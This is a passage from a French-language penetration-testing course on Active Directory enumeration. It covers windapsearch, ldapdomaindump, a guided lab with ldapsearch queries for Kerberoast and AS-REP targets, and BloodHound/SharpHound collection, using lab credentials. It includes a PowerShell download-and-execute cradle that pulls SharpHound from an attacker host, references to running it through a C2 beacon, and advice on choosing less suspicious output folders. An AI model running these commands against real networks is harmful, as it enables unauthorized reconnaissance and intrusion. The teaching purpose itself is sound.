  -u 'SDV-M2\jdoe' \
  -p 'P@ssw0rd' \
  -m "Domain Admins"

# ─── 4. Énumérer les ordinateurs ─────────────────────────────────────────────
# -C : computers (liste tous les ordinateurs du domaine)
windapsearch -d sdv-m2.lab \
  -u 'SDV-M2\jdoe' \
  -p 'P@ssw0rd' \
  -C

# ─── 5. Utilisateurs avec SPN ─────────────────────────────────────────────────
# --spn : recherche les comptes avec un Service Principal Name (Kerberoast)
windapsearch -d sdv-m2.lab \
  -u 'SDV-M2\jdoe' \
  -p 'P@ssw0rd' \
  --spn

# ─── 6. Utilisateurs sans pré-authentification (AS-REP) ─────────────────────
# --no-pre-auth : comptes sans pré-authentification Kerberos (AS-REP Roast)
windapsearch -d sdv-m2.lab \
  -u 'SDV-M2\jdoe' \
  -p 'P@ssw0rd' \
  --no-pre-auth

# ─── 7. Énumération des OU ────────────────────────────────────────────────────
# --ou : organizational units (liste les unités d'organisation)
windapsearch -d sdv-m2.lab \
  -u 'SDV-M2\jdoe' \
  -p 'P@ssw0rd' \
  --ou

# ─── 8. Utilisateurs admin (adminCount=1) ───────────────────────────────────
# --admin-count : comptes marqués comme privilégiés (membres de groupes protégés)
windapsearch -d sdv-m2.lab \
  -u 'SDV-M2\jdoe' \
  -p 'P@ssw0rd' \
  --admin-count

# ─── 9. Délégation Kerberos ───────────────────────────────────────────────────
# --delegation : comptes configurés pour la délégation Kerberos (abusable)
windapsearch -d sdv-m2.lab \
  -u 'SDV-M2\jdoe' \
  -p 'P@ssw0rd' \
  --delegation

# ─── 10. Export JSON ──────────────────────────────────────────────────────────
# -U : users  |  --json : sortie JSON structurée  |  -o : fichier de sortie
windapsearch -d sdv-m2.lab \
  -u 'SDV-M2\jdoe' \
  -p 'P@ssw0rd' \
  -U --json -o exports/windap-users.json
```

**Explication des options :**
| Option | Rôle/Explication |
|--------|------------------|
| `-d <domaine>` | Domaine cible pour la requête LDAP |
| `-u <utilisateur>` | Nom d'utilisateur pour l'authentification (format DOMAINE\\user ou user@domain) |
| `-p <mot de passe>` | Mot de passe en clair |
| `-U` | Énumération de tous les utilisateurs du domaine |
| `-G` | Énumération de tous les groupes du domaine |
| `-m <groupe>` | Liste les membres d'un groupe spécifique |
| `-C` | Énumération de tous les ordinateurs du domaine |
| `--spn` | Filtre les utilisateurs avec SPN (Kerberoastable) |
| `--no-pre-auth` | Filtre les utilisateurs sans pré-authentification (AS-REP Roastable) |
| `--ou` | Énumération des unités d'organisation |
| `--admin-count` | Filtre les utilisateurs avec adminCount=1 |
| `--delegation` | Détection des comptes avec délégation Kerberos |
| `--json` | Format de sortie JSON (exploitable par d'autres outils) |
| `-o <fichier>` | Écrit la sortie dans un fichier plutôt que sur stdout |

**Sortie typique `-U` :**
```
[+] Enumerating all Users
[+] Using base DN: DC=sdv-m2,DC=lab

sAMAccountName: jdoe
userPrincipalName: jdoe@sdv-m2.lab
displayName: John Doe
mail: jdoe@sdv-m2.lab
title: Ingénieur
department: IT
whenCreated: 2025-06-01 08:30:00
pwdLastSet: 2025-06-01 08:30:00
userAccountControl: NORMAL_ACCOUNT (512)
memberOf: CN=Domain Users,CN=Users,DC=sdv-m2,DC=lab
memberOf: CN=IT,CN=Users,DC=sdv-m2,DC=lab
[---snip---]
```

---

### 2.4 ldapdomaindump

`ldapdomaindump` est un outil qui extrait **toutes** les informations d'un domaine AD via LDAP et génère des fichiers JSON/HTML pour analyse offline.

#### Installation

```bash
# ─── Installation via pip ─────────────────────────────────────────────────────
# Installe ldapdomaindump depuis PyPI pour effectuer des exports AD complets
pip install ldapdomaindump

# ─── Vérification ─────────────────────────────────────────────────────────────
# --help affiche l'aide pour confirmer que l'outil est accessible
ldapdomaindump --help
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `pip install ldapdomaindump` | Installe ldapdomaindump et ses dépendances Python |
| `ldapdomaindump --help` | Affiche le manuel d'utilisation pour vérifier l'installation |

#### Utilisation

```bash
# ─── Création du répertoire de sortie ─────────────────────────────────────────
# -p crée le dossier et ses parents si nécessaire
mkdir -p exports/ldapdomaindump

# ─── Dump complet du domaine ──────────────────────────────────────────────────
# ldapdomaindump interroge l'annuaire LDAP et génère HTML+JSON+CSV
# ldap://192.168.1.10 : URI du contrôleur de domaine
# -u "SDV-M2\\jdoe"  : utilisateur domaine (format DOMAINE\\login)
# -p 'P@ssw0rd'      : mot de passe
# -o exports/ldapdomaindump/ : dossier de sortie
ldapdomaindump ldap://192.168.1.10 \
  -u "SDV-M2\\jdoe" \
  -p 'P@ssw0rd' \
  -o exports/ldapdomaindump/

# Paramètres supplémentaires utiles :
#   --no-html    : ne pas générer les fichiers HTML
#   --no-json    : ne pas générer les fichiers JSON
#   --depth N    : profondeur de récursion pour les membres de groupe
#   -cname       : utiliser le nom commun du DC au lieu du DNS
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `mkdir -p exports/ldapdomaindump` | Crée le dossier de sortie récursivement (ne génère pas d'erreur s'il existe) |
| `ldapdomaindump` | Outil d'export AD : interroge tous les objets et sauvegarde en formats multiples |
| `ldap://192.168.1.10` | URI du serveur LDAP (port 389 par défaut) |
| `-u "SDV-M2\\jdoe"` | Identifiant de l'utilisateur domaine |
| `-p 'P@ssw0rd'` | Mot de passe associé |
| `-o exports/ldapdomaindump/` | Répertoire de destination pour les fichiers exportés |

**Fichiers générés :**
```
exports/ldapdomaindump/
├── domain_users.html       ← Utilisateurs (tableau HTML)
├── domain_users.json       ← Utilisateurs (format JSON)
├── domain_groups.html      ← Groupes
├── domain_groups.json      ← Groupes
├── domain_computers.html   ← Ordinateurs
├── domain_computers.json   ← Ordinateurs
├── domain_policy.html      ← Politiques de mot de passe
├── domain_policy.json      ← Politiques
├── domain_trusts.html      ← Relations de confiance
├── domain_trusts.json      ← Relations de confiance
├── domain_children.html    ← Domaines enfants
├── domain_children.json    ← Domaines enfants
└── index.html              ← Page d'accueil HTML avec navigation
```

#### Navigation dans l'export HTML

Ouvrez le fichier `index.html` dans un navigateur :

```bash
# ─── Si vous êtes sur Kali (GUI) ──────────────────────────────────────────────
# Ouvre le rapport HTML généré par ldapdomaindump dans le navigateur par défaut
firefox exports/ldapdomaindump/index.html
# ou
chromium exports/ldapdomaindump/index.html
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `firefox exports/ldapdomaindump/index.html` | Ouvre le rapport HTML dans Firefox pour visualisation graphique |
| `chromium exports/ldapdomaindump/index.html` | Alternative avec Chromium si Firefox n'est pas disponible |

La page d'accueil présente :
- **User Statistics** : nombre d'utilisateurs, privilégiés, inactifs
- **Computer Statistics** : OS, versions
- **Group Overview** : groupes avec membre counts
- **Trusts** : relations de confiance
- **Password Policy** : politique de mot de passe en vigueur

---

### 2.5 TP Guidé — Énumération LDAP

#### Contexte

Vous avez obtenu les identifiants suivants lors d'une phase de reconnaissance :

| Paramètre | Valeur |
|-----------|--------|
| Domaine | `sdv-m2.lab` |
| DC IP | `192.168.1.10` |
| Utilisateur | `jdoe` |
| Mot de passe | `P@ssw0rd` |
| Base DN | `DC=sdv-m2,DC=lab` |

#### Objectifs

1. Cartographier la structure AD
2. Identifier les utilisateurs privilégiés
3. Trouver des cibles potentielles (Kerberoast, AS-REP)
4. Documenter les relations de confiance

#### Étape 1 : Validation de la connectivité

```bash
# ─── Vérifier que le DC répond sur LDAP ───────────────────────────────────────
# nmap scanne les ports LDAP standards sur le contrôleur de domaine
# -p : ports à scanner (389=LDAP, 636=LDAPS, 3268=GC, 3269=GC SSL)
# -sT : TCP connect scan (connexion complète, plus fiable que SYN)
nmap -p 389,636,3268,3269 -sT 192.168.1.10

# Sortie attendue :
# PORT     STATE SERVICE
# 389/tcp  open  ldap
# 636/tcp  open  ldaps
# 3268/tcp open  globalcatLDAP
# 3269/tcp open  globalcatLDAPssl
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `nmap -p 389,636,3268,3269` | Scan des 4 ports LDAP/GC sur la cible (ports indispensables pour AD) |
| `-sT` | TCP Connect scan : établit une connexion TCP complète (moins discret mais fiable) |
| `192.168.1.10` | Adresse IP du contrôleur de domaine à scanner |

#### Étape 2 : Structure du domaine

```bash
# ─── Récupérer les informations de base du domaine ────────────────────────────
# Interroge l'objet domainDNS pour obtenir le nom, GUID et date de création du domaine
ldapsearch -x -H ldap://192.168.1.10 \
  -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(objectClass=domainDNS)" \
  name dnsRoot objectGUID creationTime

# ─── Énumérer toutes les OU ──────────────────────────────────────────────────
# Liste les unités d'organisation pour cartographier la structure administrative
ldapsearch -x -H ldap://192.168.1.10 \
  -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(objectClass=organizationalUnit)" \
  name distinguishedName description

# ─── Compter le nombre d'objets par type ─────────────────────────────────────
# Chaque bloc contient une sous-commande ldapsearch avec -LLL (sortie allégée)
# Le résultat est filtré avec grep -c '^dn:' qui compte les lignes commençant par "dn:"
echo "=== Domain Info ==="
echo "Users: $(ldapsearch -x -H ldap://192.168.1.10 -D \"SDV-M2\\jdoe\" -w 'P@ssw0rd' -b \"DC=sdv-m2,DC=lab\" \"(&(objectClass=user)(objectCategory=person))\" -LLL | grep -c '^dn:')"

echo "Groups: $(ldapsearch -x -H ldap://192.168.1.10 -D \"SDV-M2\\jdoe\" -w 'P@ssw0rd' -b \"DC=sdv-m2,DC=lab\" \"(objectClass=group)\" -LLL | grep -c '^dn:')"

echo "Computers: $(ldapsearch -x -H ldap://192.168.1.10 -D \"SDV-M2\\jdoe\" -w 'P@ssw0rd' -b \"DC=sdv-m2,DC=lab\" \"(objectClass=computer)\" -LLL | grep -c '^dn:')"
```

**Explication des commandes :**
| Commande/Astuce | Rôle/Explication |
|----------------|------------------|
| `ldapsearch ... (objectClass=domainDNS)` | Récupère les métadonnées du domaine (GUID, date de création) |
| `ldapsearch ... (objectClass=organizationalUnit)` | Cartographie les OU pour comprendre la hiérarchie administrative |
| `grep -c '^dn:'` | Compte le nombre d'objets retournés en filtrant les lignes "dn:" |
| `$(...)` | Substitution de commande bash : exécute ldapsearch et injecte le résultat dans echo |

#### Étape 3 : Cibles à haute valeur

```bash
# ─── 1. Identifier les Domain Admins ──────────────────────────────────────────
# Interroge le groupe "Domain Admins" et retourne l'attribut "member" (liste des DN)
ldapsearch -x -H ldap://192.168.1.10 \
  -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=group)(cn=Domain Admins))" member

# Sortie attendue :
# member: CN=Administrator,CN=Users,DC=sdv-m2,DC=lab
# member: CN=jsmith,OU=IT,DC=sdv-m2,DC=lab

# ─── 2. Identification des comptes Kerberoastables ───────────────────────────
# Filtre : utilisateurs avec un SPN défini → cibles pour Kerberoasting
ldapsearch -x -H ldap://192.168.1.10 \
  -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName

# Sortie attendue :
# sAMAccountName: svc_sql
# servicePrincipalName: MSSQLSvc/sql01.sdv-m2.lab:1433
# sAMAccountName: svc_http
# servicePrincipalName: HTTP/webapp.sdv-m2.lab
# sAMAccountName: svc_ldap
# servicePrincipalName: LDAP/dc01.sdv-m2.lab

# ─── 3. Identification des comptes AS-REP Roastables ─────────────────────────
# Filtre : utilisateurs sans pré-authentification Kerberos (bit UAC 4194304)
ldapsearch -x -H ldap://192.168.1.10 \
  -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName userAccountControl

# Sortie attendue (vide si bien configuré) :
# ... aucun résultat = bonne pratique de sécurité
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `ldapsearch ... cn=Domain Admins` member | Récupère la liste des membres du groupe le plus privilégié du domaine |
| `ldapsearch ... servicePrincipalName=*` | Identifie les comptes de service avec SPN (Kerberoastables) |
| `ldapsearch ... userAccountControl:...:=4194304` | Identifie les comptes sans pré-authentification (AS-REP Roastables) |
| Attribut `servicePrincipalName` | Contient les SPN associés à un compte (MSSQLSvc, HTTP, LDAP, etc.) |
| Bitmask `4194304` (`0x400000`) | DONT_REQUIRE_PREAUTH : flag de vulnérabilité AS-REP Roasting |

#### Étape 4 : Relations de confiance

```bash
# ─── Lister les trusts du domaine ─────────────────────────────────────────────
# Interroge les objets trustedDomain qui représentent les relations de confiance
# Attributs : nom, nom NetBIOS, direction, type, attributs supplémentaires
ldapsearch -x -H ldap://192.168.1.10 \
  -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(objectClass=trustedDomain)" \
  name flatName trustDirection trustType trustAttributes

# Sortie attendue (si trust existe) :
# name: europe.sdv-m2.lab
# flatName: EUROPE-SDVM2
# trustDirection: 2  (1=inbound, 2=outbound, 3=bidirectional)
# trustType: 1  (1=Windows, 2=MIT)
# trustAttributes: 8  (8=within forest)
```

**Explication des commandes :**
| Option/Attribut | Rôle/Explication |
|-----------------|------------------|
| `(objectClass=trustedDomain)` | Filtre LDAP pour trouver les objets représentant des relations de confiance |
| `name` | Nom de domaine du trust (ex: europe.sdv-m2.lab) |
| `flatName` | Nom NetBIOS du domaine distant |
| `trustDirection` | 1=entrant, 2=sortant, 3=bidirectionnel (utile pour le "forest hopping") |
| `trustType` | 1=Windows, 2=MIT (Kerberos non-Windows) |
| `trustAttributes` | Attributs binaires : 8=inter-forêt, 32=cross-org, etc. |

#### Étape 5 : Dump complet avec ldapdomaindump

```bash
# ─── Dump complet pour analyse offline ───────────────────────────────────────
# Effectue un dump exhaustif du domaine via LDAP (génère HTML, JSON, CSV)
ldapdomaindump ldap://192.168.1.10 \
  -u "SDV-M2\\jdoe" \
  -p 'P@ssw0rd' \
  -o exports/ldapdomaindump/

# ─── Vérification des fichiers générés ───────────────────────────────────────
# ls -la liste les fichiers avec taille, permissions et date
ls -la exports/ldapdomaindump/

# ─── Analyse rapide via JSON ─────────────────────────────────────────────────
# grep avec expression régulière cherche les comptes adminCount=1 (privilégiés)
# ou les comptes avec un SPN (Kerberoastables) dans le JSON des utilisateurs
grep -E '"adminCount":1|"servicePrincipalName"' exports/ldapdomaindump/domain_users.json

# ─── Analyse des groupes privilégiés ─────────────────────────────────────────
# Pipe le JSON des groupes dans un script Python inline qui :
# 1. Parse le JSON
# 2. Filtre les groupes avec adminCount=1 ou 'Admin' dans le nom
# 3. Affiche le nom du groupe et le nombre de membres
cat exports/ldapdomaindump/domain_groups.json | python3 -c "
import json, sys
data = json.load(sys.stdin)
for g in data:
    if g.get('adminCount') == 1 or 'Admin' in g.get('cn',''):
        print('[+] ' + g['cn'] + ' — ' + str(len(g.get('member',[]))) + ' membres')
"
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `ldapdomaindump ... -o exports/ldapdomaindump/` | Export complet du domaine en formats HTML/JSON pour analyse offline |
| `ls -la exports/ldapdomaindump/` | Vérifie la présence et la taille des fichiers générés |
| `grep -E '"adminCount":1\|"servicePrincipalName"' domain_users.json` | Cherche les comptes privilégiés (adminCount=1) ou les SPN dans le JSON |
| `cat ... \| python3 -c "..."` | Pipeline : lit le fichier JSON et le traite avec un script Python inline |
| `json.load(sys.stdin)` | Fonction Python qui parse le flux JSON d'entrée en structure de données |

#### Étape 6 : Synthèse des résultats

```bash
# ─── Générer un rapport textuel ───────────────────────────────────────────────
# Utilise une redirection cat avec heredoc (<< 'RAPPORT') pour créer un fichier
# Le guillemet autour de 'RAPPORT' empêche l'expansion des variables bash ($(date) sera littéral)
cat > exports/rapport-enumeration.md << 'RAPPORT'
# Rapport d'énumération AD — sdv-m2.lab

## Résumé
- Domaine : sdv-m2.lab
- DC : dc01.sdv-m2.lab (192.168.1.10)
- Date de l'audit : $(date +%Y-%m-%d)

## Statistiques
- Utilisateurs : ...
- Groupes : ...
- Ordinateurs : ...
- OU : ...

## Cibles identifiées
### Kerberoastable
- svc_sql (MSSQLSvc/sql01.sdv-m2.lab:1433)
- svc_http (HTTP/webapp.sdv-m2.lab)

### AS-REP Roastable
- (aucun)

### Privilégiés
- jsmith (Domain Admins)
- Administrator (Domain Admins)

## Recommandations
- Désactiver les comptes Kerberoastables inutiles
- Changer les mots de passe des comptes de service
RAPPORT
```

**Explication des commandes :**
| Élément | Rôle/Explication |
|---------|------------------|
| `cat > exports/rapport-enumeration.md << 'RAPPORT'` | Crée un fichier markdown en écrivant tout le contenu jusqu'au délimiteur RAPPORT |
| `<< 'RAPPORT'` | Heredoc avec guillemets : empêche l'interprétation des `$` et autres caractères spéciaux |
| `$(date +%Y-%m-%d)` | Sera écrit littéralement (non interprété) à cause des guillemets autour de RAPPORT |
| `RAPPORT` | Délimiteur de fin du heredoc (doit être seul sur la ligne) |

---

## 3. BloodHound

### 3.1 Présentation

**BloodHound** est l'outil le plus puissant pour l'analyse des relations de confiance et des chemins d'attaque dans Active Directory. Il utilise la théorie des graphes pour :
- Cartographier les relations entre utilisateurs, groupes, ordinateurs, sessions
- Identifier les chemins les plus courts vers les cibles à haute valeur (Domain Admins, Enterprise Admins)
- Détecter les ACLs dangereuses (GenericAll, WriteDacl, WriteOwner, etc.)
- Visualiser les opportunités de Kerberoasting, AS-REP Roasting, DCSync

**Architecture :**

```
┌──────────────┐     ┌──────────────────┐     ┌──────────────────────┐
│  Collecteur  │────►│   Neo4j Database │────►│   BloodHound GUI    │
│  SharpHound  │     │   (Graph DB)     │     │   (Electron App)    │
│  BH.py       │     │   localhost:7687  │     │   localhost:8080    │
└──────────────┘     └──────────────────┘     └──────────────────────┘
     │
     │ Sortie : JSON / ZIP
     ▼
fichiers .json
```

**Technique MITRE ATT&CK : T1087 — Account Discovery**, T1069 — Permission Groups Discovery

### 3.2 Installation de Neo4j

Neo4j est la base de données graphe utilisée par BloodHound.

```bash
# ─── Installation sur Kali/Debian ─────────────────────────────────────────────

# Méthode 1 : via le dépôt officiel Neo4j
# Télécharge et ajoute la clé GPG officielle Neo4j au trousseau apt
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
# Ajoute le dépôt Neo4j à la liste des sources APT
echo 'deb https://debian.neo4j.com stable 4.4' | sudo tee /etc/apt/sources.list.d/neo4j.list
# Rafraîchit la liste des paquets depuis le nouveau dépôt
sudo apt update
# Installe Neo4j (base de données graphe utilisée par BloodHound)
sudo apt install -y neo4j

# Méthode 2 : via apt standard (version parfois plus ancienne)
sudo apt update && sudo apt install -y neo4j

# ─── Démarrer Neo4j ──────────────────────────────────────────────────────────
# systemctl start : démarre le service Neo4j immédiatement
sudo systemctl start neo4j
# systemctl enable : configure le démarrage automatique de Neo4j au boot
sudo systemctl enable neo4j

# ─── Vérifier le statut ──────────────────────────────────────────────────────
# Affiche le statut du service (actif/inactif, logs récents)
sudo systemctl status neo4j
# Sortie attendue :
# ● neo4j.service - Neo4j Graph Database
#    Loaded: loaded ...
#    Active: active (running) since ...

# ─── Ports utilisés par Neo4j ────────────────────────────────────────────────
# ss : socket statistics, -t (TCP), -l (listening), -n (numérique), -p (processus)
ss -tlnp | grep -E '7474|7687'
# 7474 → Interface HTTP (Browser Neo4j)
# 7687 → Bolt (protocole binaire pour les clients)

# ─── Configuration du mot de passe Neo4j ──────────────────────────────────────
# Accéder au navigateur Neo4j : http://localhost:7474
# Identifiants par défaut :
#   Utilisateur : neo4j
#   Mot de passe : neo4j   (changé à la première connexion)

# Via ligne de commande (alternative) :
# Définit le mot de passe initial de la base Neo4j (évite la première connexion interactive)
neo4j-admin set-initial-password bloodhound
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `wget -O - ... \| sudo apt-key add -` | Télécharge la clé GPG Neo4j et l'ajoute aux clés de confiance APT |
| `echo 'deb ...' \| sudo tee /etc/apt/sources.list.d/neo4j.list` | Ajoute le dépôt Neo4j à APT |
| `sudo apt update` | Rafraîchit l'index des paquets (nécessaire après ajout d'un dépôt) |
| `sudo apt install -y neo4j` | Installe Neo4j sans confirmation interactive |
| `sudo systemctl start neo4j` | Démarre le service Neo4j immédiatement |
| `sudo systemctl enable neo4j` | Active le démarrage automatique de Neo4j au démarrage du système |
| `sudo systemctl status neo4j` | Vérifie que Neo4j tourne correctement |
| `ss -tlnp \| grep -E '7474\|7687'` | Vérifie les ports d'écoute (7474 HTTP, 7687 Bolt) |
| `neo4j-admin set-initial-password bloodhound` | Définit le mot de passe admin Neo4j en ligne de commande |

**⚠️ Note importante :** Neo4j version 4.4.x est recommandée pour BloodHound.

```bash
# === INSTALLATION DE BLOODHOUND (première fois uniquement) ===
sudo apt install -y neo4j bloodhound
sudo neo4j start
# Au premier lancement, Neo4j demande de changer le mot de passe.
# Navigateur → http://localhost:7474 → login: neo4j / password: neo4j
# Définir un nouveau mot de passe (ex: bloodhound) puis lancer BloodHound :
bloodhound &
```

```bash
# ─── Vérifier la version de Neo4j ─────────────────────────────────────────────
# dpkg -l liste les paquets installés, grep filtre ceux contenant "neo4j"
dpkg -l | grep neo4j

# ─── Arrêt/démarrage manuel ───────────────────────────────────────────────────
# Commandes de contrôle direct du service Neo4j (alternative à systemctl)
sudo neo4j stop
sudo neo4j start
sudo neo4j restart
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `dpkg -l \| grep neo4j` | Liste les paquets Debian installés contenant "neo4j" dans leur nom |
| `sudo neo4j stop` | Arrête le service Neo4j manuellement |
| `sudo neo4j start` | Démarre le service Neo4j manuellement |
| `sudo neo4j restart` | Redémarre le service Neo4j (stop + start) |

### 3.3 Installation de BloodHound GUI

```bash
# ─── Téléchargement de la dernière release depuis GitHub ──────────────────────
# Rendez-vous sur : https://github.com/BloodHoundAD/BloodHound/releases
# Ou téléchargez directement la version 4.3.1 (archive ZIP)

wget https://github.com/BloodHoundAD/BloodHound/releases/download/v4.3.1/BloodHound-linux-x64.zip

# ─── Extraction ───────────────────────────────────────────────────────────────
# unzip extrait l'archive dans /opt/ (dossier standard pour programmes tiers)
unzip BloodHound-linux-x64.zip -d /opt/
# Renomme le dossier extrait en /opt/BloodHound pour simplifier l'accès
sudo mv /opt/BloodHound-linux-x64 /opt/BloodHound

# ─── Vérification de l'extraction ─────────────────────────────────────────────
# Liste le contenu du dossier BloodHound pour confirmer la présence du binaire
ls -la /opt/BloodHound/
# Sortie attendue :
# -rwxr-xr-x  BloodHound                  (binaire exécutable)
# drwxr-xr-x  resources/
# drwxr-xr-x  locales/

# ─── Lancement de BloodHound (après avoir démarré Neo4j) ──────────────────────
# Le & place le processus en arrière-plan (background)
/opt/BloodHound/BloodHound &

# Vous pouvez aussi créer un alias dans ~/.bashrc :
# >> ajoute la ligne à la fin de ~/.bashrc pour charger l'alias à chaque session
echo "alias bloodhound='/opt/BloodHound/BloodHound &'" >> ~/.bashrc
# source recharge le fichier .bashrc pour activer l'alias immédiatement
source ~/.bashrc
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `wget <url>` | Télécharge l'archive ZIP de BloodHound depuis GitHub |
| `unzip ... -d /opt/` | Extrait l'archive ZIP dans le dossier /opt/ |
| `sudo mv ... /opt/BloodHound` | Renomme le dossier extrait pour un accès simplifié |
| `ls -la /opt/BloodHound/` | Vérifie que l'extraction s'est bien déroulée |
| `/opt/BloodHound/BloodHound &` | Lance BloodHound en arrière-plan (le & libère le terminal) |
| `echo "alias ..." >> ~/.bashrc` | Ajoute un alias permanent dans le fichier de configuration bash |
| `source ~/.bashrc` | Recharge la configuration bash pour utiliser l'alias sans ouvrir un nouveau terminal |

#### Connexion à BloodHound

1. Lancer Neo4j : `sudo neo4j start`
2. Lancer BloodHound : `/opt/BloodHound/BloodHound`
3. Écran de login :
   - **Database URL** : `bolt://localhost:7687`
   - **Username** : `neo4j`
   - **Password** : `bloodhound` (ou celui défini)

> **⚠️ Attention :** Les identifiants Neo4j par défaut sont `neo4j:neo4j` — changez-les en production !

### 3.4 Collecte des données

Il existe deux collecteurs principaux pour BloodHound :

1. **SharpHound** (Windows) — C# .NET, collecte la plus complète
2. **BloodHound.py** (Linux) — Python, alternative légère

#### SharpHound (Windows)

```powershell
# ─── Téléchargement de SharpHound.ps1 (version PowerShell) ────────────────────
# Depuis une machine Windows du domaine (ou via un beacon C2)

# Option 1 : SharpHound.ps1 (PowerShell)
# IEX (Invoke-Expression) télécharge et exécute le script directement en mémoire
# New-Object Net.WebClient crée un client HTTP pour télécharger le script
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/SharpHound.ps1')
# Invoke-BloodHound lance la collecte avec toutes les méthodes disponibles
# -OutputDirectory : dossier de destination  |  -ZipFileName : nom du ZIP
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp -ZipFileName ldap

# Option 2 : SharpHound.exe (binaire)
# Télécharger depuis : https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
# -c All : collecte toutes les données disponibles
SharpHound.exe -c All --zipfilename sdvm2

# Option 3 : Via upload C2
# Exécution directe du binaire SharpHound depuis un serveur C2
# shell SharpHound.exe -c All
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|-----------------|------------------|
| `IEX (New-Object Net.WebClient).DownloadString(...)` | Télécharge et exécute un script PowerShell en mémoire (technique "fileless") |
| `Invoke-BloodHound -CollectionMethod All` | Lance la collecte BloodHound avec toutes les méthodes disponibles |
| `-OutputDirectory C:\Temp` | Dossier de sortie pour les fichiers JSON/ZIP collectés |
| `-ZipFileName ldap` | Nom du fichier ZIP généré (compressé pour transfert) |
| `SharpHound.exe -c All --zipfilename sdvm2` | Version binaire .NET, similaire à la version PowerShell mais exécutable directement |
| `--zipfilename` | Option de SharpHound.exe pour nommer l'archive ZIP de sortie |

**Méthodes de collecte :**

| Flag | Méthode | Description |
|------|---------|-------------|
| `-c All` | Toutes | Collecte complète (recommandé) |
| `-c Default` | Défaut | Groupes, utilisateurs, sessions |
| `-c DCOnly` | DC uniquement | Sans scanner les machines distantes |
| `-c Group` | Groupes | Membres de groupes seulement |
| `-c LocalAdmin` | Admins locaux | Utilisateurs avec droits admin |
| `-c RDP` | RDP | Utilisateurs avec accès RDP |
| `-c Session` | Sessions | Sessions actives |
| `-c Trusts` | Trusts | Relations de confiance |
| `-c ACL` | ACLs | Permissions DACL |
| `-c Container` | Conteneurs | OU et conteneurs |
| `-c DCOM` | DCOM | Utilisateurs avec accès DCOM |
| `-c PSRemote` | PSRemote | Utilisateurs avec accès WinRM |
| `-c LoggedOn` | LoggedOn | Sessions utilisateur |

```powershell
# ─── Exemple : collecte rapide (seulement DC) ────────────────────────────────
# DCOnly : collecte uniquement depuis le contrôleur de domaine (pas de scans distants)
SharpHound.exe -c DCOnly --zipfilename rapid-dc

# ─── Exemple : collecte sans sessions (plus discret) ──────────────────────────
# Limite la collecte aux groupes, admins locaux, ACLs et trusts (pas de sessions)
SharpHound.exe -c Group,LocalAdmin,ACL,Trusts --zipfilename no-sessions

# ─── Exemple : toutes les collectes ──────────────────────────────────────────
# Collecte complète avec sortie dans C:\Windows\Temp et horodatage dans le nom
SharpHound.exe -c All --outputdirectory C:\Windows\Temp\ --zipfilename full-$(Get-Date -Format 'yyyyMMdd-HHmmss')
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `-c DCOnly` | Collecte limitée au DC (pas de scan des machines distantes, plus rapide/discret) |
| `-c Group,LocalAdmin,ACL,Trusts` | Collecte sélective sans sessions (évite les connexions aux postes de travail) |
| `-c All` | Collecte exhaustive de toutes les données disponibles (recommandé) |
| `--outputdirectory C:\Windows\Temp\` | Dossier de sortie (C:\Windows\Temp est moins suspect) |
| `$(Get-Date -Format 'yyyyMMdd-HHmmss')` | PowerShell : insère la date/heure actuelle dans le nom du fichier |

**Sortie :** un fichier ZIP contenant des fichiers JSON :

```
20250528-sdvm2.zip
├── 20250528143000_users.json
├── 20250528143000_groups.json
├── 20250528143000_computers.json
├── 20250528143000_sessions.json
├── 20250528143000_acl.json
├── 20250528143000_container.json
├── 20250528143000_dcom.json
├── 20250528143000_psremote.json
├── 20250528143000_trusts.json
└── META-INF/
    └── manifest.json
```

#### BloodHound.py (Linux)

```bash
# ─── Installation de BloodHound.py ────────────────────────────────────────────
# pip installe le paquet "bloodhound" (le collecteur Python pour BloodHound)
pip install bloodhound

# ─── Vérification ─────────────────────────────────────────────────────────────
# Affiche l'aide pour confirmer que bloodhound-python est accessible
bloodhound-python --help
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `pip install bloodhound` | Installe bloodhound.py, le collecteur AD Python pour BloodHound (alternative Linux à SharpHound) |
| `bloodhound-python --help` | Vérifie l'installation et affiche les options disponibles |

```bash
# ─── Collecte avec BloodHound.py ──────────────────────────────────────────────
# Paramètres :
#   -d : domaine cible
#   -u : nom d'utilisateur
#   -p : mot de passe
#   -dc : DC pour la collecte LDAP
#   -gc : Global Catalog (collecte multi-domaines)
#   -c : méthodes de collecte (ALL, DCOnly, Group, Session, etc.)
#   --zip : compresser les fichiers JSON en ZIP pour transfert
#   -ns : serveur DNS (parfois nécessaire si résolution DNS défaillante)
#   -o : dossier de sortie

# ─── Collecte complète (nécessite un compte domaine) ──────────────────────────
# Crée le dossier de sortie (avec -p pour créer les parents si besoin)
mkdir -p exports/bloodhound

bloodhound-python -d sdv-m2.lab \
  -u jdoe \
